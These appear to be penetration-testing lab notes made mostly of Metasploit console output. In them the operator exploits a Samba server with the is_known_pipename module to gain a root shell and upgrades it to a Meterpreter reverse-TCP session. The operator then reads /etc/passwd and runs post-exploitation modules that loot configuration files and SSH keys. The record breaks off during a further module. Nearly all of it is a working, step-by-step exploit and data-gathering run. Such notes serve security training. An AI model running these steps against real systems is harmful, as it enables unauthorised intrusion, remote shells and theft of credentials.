- The MSF provides us with various post exploitation modules for both windows and linux.
- We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
	- Enumerate system configuration
	- Enumerate environment variables
	- Enumerate network configuration
	- VM check
	- Enumerate user history

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.11  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0b  txqueuelen 0  (Ethernet)
        RX packets 89  bytes 8730 (8.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 71  bytes 311136 (303.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.203.126.2  netmask 255.255.255.0  broadcast 192.203.126.255
        ether 02:42:c0:cb:7e:02  txqueuelen 0  (Ethernet)
        RX packets 17  bytes 1486 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~# service postgresql start && msfconsole
[ ok ] Starting PostgreSQL 11 database server: main.

       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > workspace -a Linux_PE
[*] Added workspace: Linux_PE
[*] Workspace: Linux_PE
msf5 > setg rhosts 192.203.126.3
rhosts => 192.203.126.3
msf5 > db_nmap -sV 192.203.126.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-08 11:17 UTC
[*] Nmap: Nmap scan report for target-1 (192.203.126.3)
[*] Nmap: Host is up (0.0000090s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:CB:7E:03 (Unknown)
[*] Nmap: Service Info: Host: VICTIM-1
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
msf5 > search type:exploit name:samba

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   1   exploit/freebsd/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   2   exploit/linux/samba/chain_reply              2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   3   exploit/linux/samba/is_known_pipename        2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   4   exploit/linux/samba/lsa_transnames_heap      2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   5   exploit/linux/samba/setinfopolicy_heap       2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   6   exploit/linux/samba/trans2open               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   7   exploit/multi/samba/nttrans                  2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   8   exploit/multi/samba/usermap_script           2007-05-14       excellent  No     Samba "username map script" Command Execution
   9   exploit/osx/samba/lsa_transnames_heap        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   10  exploit/osx/samba/trans2open                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   11  exploit/solaris/samba/lsa_transnames_heap    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   12  exploit/solaris/samba/trans2open             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   13  exploit/windows/http/sambar6_search_results  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow


msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.203.126.3    yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] 192.203.126.3:445 - Using location \\192.203.126.3\exploitable\tmp for the path
[*] 192.203.126.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.203.126.3:445 - Share 'exploitable' has server-side path '/
[*] 192.203.126.3:445 - Uploaded payload to \\192.203.126.3\exploitable\tmp\SdONfJWu.so
[*] 192.203.126.3:445 - Loading the payload from server-side path /tmp/SdONfJWu.so using \\PIPE\/tmp/SdONfJWu.so...
[-] 192.203.126.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.203.126.3:445 - Loading the payload from server-side path /tmp/SdONfJWu.so using /tmp/SdONfJWu.so...
[+] 192.203.126.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.203.126.2:46845 -> 192.203.126.3:445) at 2023-08-08 11:18:54 +0000

pwd
/tmp
^Z
Background session 1? [y/N]  y
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.203.126.2:46845 -> 192.203.126.3:445 (192.203.126.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.203.126.2:4433 
[*] Sending stage (985320 bytes) to 192.203.126.3
[*] Meterpreter session 2 opened (192.203.126.2:4433 -> 192.203.126.3:59886) at 2023-08-08 11:19:44 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.203.126.2:46845 -> 192.203.126.3:445 (192.203.126.3)
  2         meterpreter x86/linux               192.203.126.2:4433 -> 192.203.126.3:59886 (192.203.126.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
[-] Unknown command: getuid.
meterpreter > sysinfo
[-] Unknown command: sysinfo.
meterpreter > 
[*] Stopping exploit/multi/handler

Background session 2? [y/N]  
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.203.126.2:46845 -> 192.203.126.3:445 (192.203.126.3)
  2         meterpreter x86/linux               192.203.126.2:4433 -> 192.203.126.3:59886 (192.203.126.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
[-] Unknown command: getuid.
meterpreter > 
Background session 2? [y/N]  
[*] Backgrounding foreground process in the shell session
msf5 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
[-] Unknown command: sysinfo.
meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.203.126.3 - Meterpreter session 2 closed.  Reason: User exit
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.203.126.2:46845 -> 192.203.126.3:445 (192.203.126.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.203.126.2:4433 
[*] Sending stage (985320 bytes) to 192.203.126.3
[*] Meterpreter session 3 opened (192.203.126.2:4433 -> 192.203.126.3:45770) at 2023-08-08 11:22:04 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.203.126.2:46845 -> 192.203.126.3:445 (192.203.126.3)
  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.203.126.3  192.203.126.2:4433 -> 192.203.126.3:45770 (192.203.126.3)
msf5 exploit(linux/samba/is_known_pipename) > sessions 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer     : 192.203.126.3
OS           : Debian 8.11 (Linux 5.4.0-153-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > shell
Process 48 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# whoami
whoami
root
root@victim-1:/tmp# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
colord:x:105:112:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:106:113::/var/lib/saned:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
root@victim-1:/tmp#
root@victim-1:/tmp# groups root
groups root
root : root
root@victim-1:/tmp# cat /etc/*issue
cat /etc/*issue
Debian GNU/Linux 8 \n \l

root@victim-1:/tmp# uname -r
uname -r
5.4.0-153-generic
root@victim-1:/tmp# uname -a
uname -a
Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 GNU/Linux
root@victim-1:/tmp#
root@victim-1:/tmp# ifconfig
ifconfig
bash: ifconfig: command not found
root@victim-1:/tmp# ip a s
ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
12755: eth0@if12756: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:cb:7e:03 brd ff:ff:ff:ff:ff:ff
    inet 192.203.126.3/24 brd 192.203.126.255 scope global eth0
       valid_lft forever preferred_lft forever
root@victim-1:/tmp# netstat -antp
netstat -antp
bash: netstat: command not found
root@victim-1:/tmp# ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  20044  2912 ?        Ss   11:15   0:00 /bin/bash /root/start.sh
root           8  0.0  0.0 292840 14732 ?        Ss   11:15   0:00 /usr/local/samba/sbin/smbd -D
root           9  0.0  0.0  47076 15720 ?        S    11:15   0:00 /usr/bin/python /usr/bin/supervisord -n
root          10  0.0  0.0 292840  6784 ?        S    11:15   0:00 /usr/local/samba/sbin/smbd -D
root          22  0.0  0.0   4336  1568 ?        S    11:18   0:00 /bin/sh
root          41  0.0  0.0   1156  1032 ?        S    11:22   0:00 /tmp/olmjE
root          48  0.0  0.0   4336   732 ?        S    11:25   0:00 /bin/sh
root          49  0.0  0.0  20224  3300 ?        S    11:25   0:00 /bin/bash -i
root          64  0.0  0.0  17504  2068 ?        R    11:29   0:00 ps aux
root@victim-1:/tmp# env
env
USER=root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
PWD=/tmp
LANG=C
SHLVL=1
HOME=/root
_=/usr/bin/env
root@victim-1:/tmp#
```

```
msf5 exploit(linux/samba/is_known_pipename) > search enum_configs

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   1  post/linux/gather/enum_configs                   normal  No     Linux Gather Configurations


msf5 exploit(linux/samba/is_known_pipename) > use post/linux/gather/enum_configs
msf5 post(linux/gather/enum_configs) > options

Module options (post/linux/gather/enum_configs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_configs) > set session 3
session => 3
msf5 post(linux/gather/enum_configs) > run

[*] Running module against 192.203.126.3 [victim-1]
[*] Info:
[*]     Debian GNU/Linux 8  
[*]     Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 GNU/Linux
[-] Failed to open file: /etc/apache2/apache2.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/apache2/ports.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/nginx/nginx.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snort/snort.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mysql/my.cnf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/ufw.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/ufw/sysctl.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/security.access.conf: core_channel_open: Operation failed: 1
[+] shells stored in /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_264600.txt
[+] sepermit.conf stored in /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_028577.txt
[+] ca-certificates.conf stored in /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_648350.txt
[+] access.conf stored in /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_371431.txt
[-] Failed to open file: /etc/gated.conf: core_channel_open: Operation failed: 1
[+] rpc stored in /root/.msf4/loot/20230808113105_Linux_PE_192.203.126.3_linux.enum.conf_291766.txt
[-] Failed to open file: /etc/psad/psad.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mysql/debian.cnf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/chkrootkit.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/logrotate.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/rkhunter.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/samba/smb.conf: core_channel_open: Operation failed: 1
[+] ldap.conf stored in /root/.msf4/loot/20230808113106_Linux_PE_192.203.126.3_linux.enum.conf_373285.txt
[-] Failed to open file: /etc/openldap/openldap.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cups/cups.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/opt/lampp/etc/httpd.conf: core_channel_open: Operation failed: 1
[+] sysctl.conf stored in /root/.msf4/loot/20230808113106_Linux_PE_192.203.126.3_linux.enum.conf_513712.txt
[-] Failed to open file: /etc/proxychains.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cups/snmp.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/mail/sendmail.conf: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/snmp/snmp.conf: core_channel_open: Operation failed: 1
[*] Post module execution completed
msf5 post(linux/gather/enum_configs) >
```

```
msf5 post(linux/gather/enum_configs) > loot

Loot
====

host           service  type             name                  content     info  path
----           -------  ----             ----                  -------     ----  ----
192.203.126.3           linux.enum.conf  shells                text/plain        /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_264600.txt
192.203.126.3           linux.enum.conf  sepermit.conf         text/plain        /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_028577.txt
192.203.126.3           linux.enum.conf  ca-certificates.conf  text/plain        /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_648350.txt
192.203.126.3           linux.enum.conf  access.conf           text/plain        /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_371431.txt
192.203.126.3           linux.enum.conf  rpc                   text/plain        /root/.msf4/loot/20230808113105_Linux_PE_192.203.126.3_linux.enum.conf_291766.txt
192.203.126.3           linux.enum.conf  ldap.conf             text/plain        /root/.msf4/loot/20230808113106_Linux_PE_192.203.126.3_linux.enum.conf_373285.txt
192.203.126.3           linux.enum.conf  sysctl.conf           text/plain        /root/.msf4/loot/20230808113106_Linux_PE_192.203.126.3_linux.enum.conf_513712.txt

msf5 post(linux/gather/enum_configs) > cat /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_371431.txt
[*] exec: cat /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_371431.txt

# Login access control table.
#
# Comment line must start with "#", no space at front.
# Order of lines is important.
#
# When someone logs in, the table is scanned for the first entry that
# matches the (user, host) combination, or, in case of non-networked
# logins, the first entry that matches the (user, tty) combination.  The
# permissions field of that table entry determines whether the login will
# be accepted or refused.
#
# Format of the login access control table is three fields separated by a
# ":" character:
#
# [Note, if you supply a 'fieldsep=|' argument to the pam_access.so
# module, you can change the field separation character to be
# '|'. This is useful for configurations where you are trying to use
# pam_access with X applications that provide PAM_TTY values that are
# the display variable like "host:0".]
#
#       permission : users : origins
#
# The first field should be a "+" (access granted) or "-" (access denied)
# character.
#
# The second field should be a list of one or more login names, group
# names, or ALL (always matches). A pattern of the form user@host is
# matched when the login name matches the "user" part, and when the
# "host" part matches the local machine name.
#
# The third field should be a list of one or more tty names (for
# non-networked logins), host names, domain names (begin with "."), host
# addresses, internet network numbers (end with "."), ALL (always
# matches), NONE (matches no tty on non-networked logins) or
# LOCAL (matches any string that does not contain a "." character).
#
# You can use @netgroupname in host or user patterns; this even works
# for @usergroup@@hostgroup patterns.
#
# The EXCEPT operator makes it possible to write very compact rules.
#
# The group file is searched only when a name does not match that of the
# logged-in user. Both the user's primary group is matched, as well as
# groups in which users are explicitly listed.
# To avoid problems with accounts, which have the same name as a group,
# you can use brackets around group names '(group)' to differentiate.
# In this case, you should also set the "nodefgroup" option.
#
# TTY NAMES: Must be in the form returned by ttyname(3) less the initial
# "/dev" (e.g. tty1 or vc/1)
#
##############################################################################
#
# Disallow non-root logins on tty1
#
#-:ALL EXCEPT root:tty1
#
# Disallow console logins to all but a few accounts.
#
#-:ALL EXCEPT wheel shutdown sync:LOCAL
#
# Same, but make sure that really the group wheel and not the user
# wheel is used (use nodefgroup argument, too):
#
#-:ALL EXCEPT (wheel) shutdown sync:LOCAL
#
# Disallow non-local logins to privileged accounts (group wheel).
#
#-:wheel:ALL EXCEPT LOCAL .win.tue.nl
#
# Some accounts are not allowed to login from anywhere:
#
#-:wsbscaro wsbsecr wsbspac wsbsym wscosor wstaiwde:ALL
#
# All other accounts are allowed to login from anywhere.
#
##############################################################################
# All lines from here up to the end are building a more complex example.
##############################################################################
#
# User "root" should be allowed to get access via cron .. tty5 tty6.
#+ : root : cron crond :0 tty1 tty2 tty3 tty4 tty5 tty6
#
# User "root" should be allowed to get access from hosts with ip addresses.
#+ : root : 192.168.200.1 192.168.200.4 192.168.200.9
#+ : root : 127.0.0.1
#
# User "root" should get access from network 192.168.201.
# This term will be evaluated by string matching.
# comment: It might be better to use network/netmask instead.
#          The same is 192.168.201.0/24 or 192.168.201.0/255.255.255.0
#+ : root : 192.168.201.
#
# User "root" should be able to have access from domain.
# Uses string matching also.
#+ : root : .foo.bar.org
#
# User "root" should be denied to get access from all other sources.
#- : root : ALL
#
# User "foo" and members of netgroup "nis_group" should be
# allowed to get access from all sources.
# This will only work if netgroup service is available.
#+ : @nis_group foo : ALL
#
# User "john" should get access from ipv4 net/mask
#+ : john : 127.0.0.0/24
#
# User "john" should get access from ipv4 as ipv6 net/mask
#+ : john : ::ffff:127.0.0.0/127
#
# User "john" should get access from ipv6 host address
#+ : john : 2001:4ca0:0:101::1
#
# User "john" should get access from ipv6 host address (same as above)
#+ : john : 2001:4ca0:0:101:0:0:0:1
#
# User "john" should get access from ipv6 net/mask
#+ : john : 2001:4ca0:0:101::/64
#
# All other users should be denied to get access from all sources.
#- : ALL : ALL
msf5 post(linux/gather/enum_configs) >
```

```
msf5 post(linux/gather/enum_configs) > search platform:linux env

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   1   auxiliary/gather/alienvault_iso27001_sqli             2014-03-30       normal     No     AlienVault Authenticated SQL Injection Arbitrary File Read
   2   exploit/linux/http/belkin_login_bof                   2014-05-09       normal     Yes    Belkin Play N750 login.cgi Buffer Overflow
   3   exploit/linux/http/dlink_dspw110_cookie_noauth_exec   2015-06-12       normal     Yes    D-Link Cookie Command Execution
   4   exploit/linux/http/dlink_dspw215_info_cgi_bof         2014-05-22       normal     Yes    D-Link info.cgi POST Request Buffer Overflow
   5   exploit/linux/http/dlink_hnap_bof                     2014-05-15       normal     Yes    D-Link HNAP Request Remote Buffer Overflow
   6   exploit/linux/http/ipfire_bashbug_exec                2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   7   exploit/linux/http/multi_ncc_ping_exec                2015-02-26       normal     Yes    D-Link/TRENDnet NCC Service Command Injection
   8   exploit/linux/http/trueonline_p660hn_v2_rce           2016-12-26       excellent  Yes    TrueOnline / ZyXEL P660HN-T v2 Router Authenticated Command Injection
   9   exploit/linux/local/asan_suid_executable_priv_esc     2016-02-17       excellent  Yes    AddressSanitizer (ASan) SUID Executable Privilege Escalation
   10  exploit/linux/local/glibc_ld_audit_dso_load_priv_esc  2010-10-18       excellent  Yes    glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation
   11  exploit/linux/local/glibc_origin_expansion_priv_esc   2010-10-18       excellent  Yes    glibc '$ORIGIN' Expansion Privilege Escalation
   12  exploit/linux/local/hp_smhstart                       2013-03-30       normal     No     HP System Management Homepage Local Privilege Escalation
   13  exploit/linux/local/ntfs3g_priv_esc                   2017-01-05       good       Yes    Debian/Ubuntu ntfs-3g Local Privilege Escalation
   14  exploit/multi/browser/java_jre17_exec                 2012-08-26       excellent  No     Java 7 Applet Remote Code Execution
   15  exploit/multi/browser/java_jre17_jmxbean              2013-01-10       excellent  No     Java Applet JMX Remote Code Execution
   16  exploit/multi/browser/java_trusted_chain              2010-03-31       excellent  No     Java Statement.invoke() Trusted Method Chain Privilege Escalation
   17  exploit/multi/ftp/pureftpd_bash_env_exec              2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   18  exploit/multi/http/apache_mod_cgi_bash_env_exec       2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   19  exploit/multi/http/oracle_reports_rce                 2014-01-15       great      Yes    Oracle Forms and Reports Remote Code Execution
   20  exploit/multi/misc/xdh_x_exec                         2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
   21  post/linux/gather/checkvm                                              normal     No     Linux Gather Virtual Environment Detection
   22  post/linux/gather/openvpn_credentials                                  normal     No     OpenVPN Gather Credentials
   23  post/multi/gather/env                                                  normal     No     Multi Gather Generic Operating System Environment Settings
   24  post/multi/manage/system_session                                       normal     No     Multi Manage System Remote TCP Shell Session


msf5 post(linux/gather/enum_configs) > use post/multi/gather/env
msf5 post(multi/gather/env) > options

Module options (post/multi/gather/env):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(multi/gather/env) > set session 3
session => 3
msf5 post(multi/gather/env) > run

[*] Debian 8.11 (Linux 5.4.0-153-generic)
[*] Post module execution completed
```

```
msf5 post(multi/gather/env) > search enum_network

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   1  post/linux/gather/enum_network                   normal  No     Linux Gather Network Information


msf5 post(multi/gather/env) > use post/linux/gather/enum_network
msf5 post(linux/gather/enum_network) > options

Module options (post/linux/gather/enum_network):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/enum_network) > set session 3
session => 3
msf5 post(linux/gather/enum_network) > run

[*] Running module against 192.203.126.3
[*] Module running as root
[+] Info:
[+]     Debian GNU/Linux 8  
[+]     Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 GNU/Linux
[*] Collecting data...
[-] Failed to open file: /etc/ssh/sshd_config: core_channel_open: Operation failed: 1
[-] Unable to get data for Network config
[-] Unable to get data for Route table
[+] Firewall config stored in /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_278187.txt
[+] DNS config stored in /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_212043.txt
[-] Unable to get data for SSHD config
[+] Host file stored in /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_286268.txt
[+] SSH keys stored in /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_344138.txt
[-] Unable to get data for Active connections
[-] Unable to get data for Wireless information
[-] Unable to get data for Listening ports
[+] If-Up/If-Down stored in /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_297203.txt
[*] Post module execution completed
msf5 post(linux/gather/enum_network) >
msf5 post(linux/gather/enum_network) > loot

Loot
====

host           service  type                name                  content     info             path
----           -------  ----                ----                  -------     ----             ----
192.203.126.3           linux.enum.conf     shells                text/plain                   /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_264600.txt
192.203.126.3           linux.enum.conf     sepermit.conf         text/plain                   /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_028577.txt
192.203.126.3           linux.enum.conf     ca-certificates.conf  text/plain                   /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_648350.txt
192.203.126.3           linux.enum.conf     access.conf           text/plain                   /root/.msf4/loot/20230808113104_Linux_PE_192.203.126.3_linux.enum.conf_371431.txt
192.203.126.3           linux.enum.conf     rpc                   text/plain                   /root/.msf4/loot/20230808113105_Linux_PE_192.203.126.3_linux.enum.conf_291766.txt
192.203.126.3           linux.enum.conf     ldap.conf             text/plain                   /root/.msf4/loot/20230808113106_Linux_PE_192.203.126.3_linux.enum.conf_373285.txt
192.203.126.3           linux.enum.conf     sysctl.conf           text/plain                   /root/.msf4/loot/20230808113106_Linux_PE_192.203.126.3_linux.enum.conf_513712.txt
192.203.126.3           linux.enum.network                        text/plain  Firewall config  /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_278187.txt
192.203.126.3           linux.enum.network                        text/plain  DNS config       /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_212043.txt
192.203.126.3           linux.enum.network                        text/plain  Host file        /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_286268.txt
192.203.126.3           linux.enum.network                        text/plain  SSH keys         /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_344138.txt
192.203.126.3           linux.enum.network                        text/plain  If-Up/If-Down    /root/.msf4/loot/20230808114219_Linux_PE_192.203.126.3_linux.enum.netwo_297203.txt
```

```
msf5 post(linux/gather/enum_network) > search enum_protections

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   1  post/linux/gather/enum_protections                   normal  No     Linux Gather Protection Enumeration


msf5 post(linux/gather/enum_network) > use post/linux/gather/enum_protections
msf5 post(linux/gather/enum_protections) > options

Module options (post/linux/gather/enum_protections):

